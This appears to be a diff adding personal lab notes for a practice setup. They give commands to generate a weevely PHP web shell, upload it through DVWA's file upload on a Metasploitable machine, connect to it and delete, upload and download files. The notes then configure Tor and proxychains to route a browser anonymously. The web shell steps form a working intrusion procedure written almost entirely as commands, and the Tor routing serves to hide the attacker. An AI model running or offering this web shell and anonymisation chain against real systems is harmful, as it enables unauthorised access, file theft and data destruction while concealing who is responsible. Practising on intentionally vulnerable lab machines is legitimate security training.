@@ -1,0 +1,19 @@
+sudo apt install weevely
+weevely generate password shell.
+(Firefox -> metasploitable_ip -> dvwa -> security -> upload)
+(Firefox -> http://10.0.2.4/dvwa/hackable/uploads/shell.php)
+weevely http://10.0.2.4/dvwa/hackable/uploads/shell.php password
+ls
+system_info
+file_rm
+file_upload
+file_download
+
+sudo apt-get install proxychains
+sudo apt-get install tor
+service tor status
+service tor start
+nano /etc/proxychains4.conf
+(strict, dynamic, last line 5)
+service tor restart
+(new tab no sudo) proxychains4 firefox google.com
